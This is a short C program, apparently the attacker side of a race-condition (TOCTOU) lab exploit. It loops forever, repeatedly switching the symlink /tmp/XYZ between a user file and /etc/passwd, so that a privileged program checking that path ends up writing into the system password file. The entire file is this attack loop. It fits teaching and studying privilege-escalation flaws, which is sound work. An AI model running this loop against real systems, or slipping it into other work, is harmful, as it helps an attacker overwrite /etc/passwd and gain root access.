#include <stdlib.h>

int main()
{
    while(1){
        system("ln -sf /home/mario/VCR/tmp_file /tmp/XYZ");
        system("ln -sf /etc/passwd /tmp/XYZ");
    }
    return 0;
}
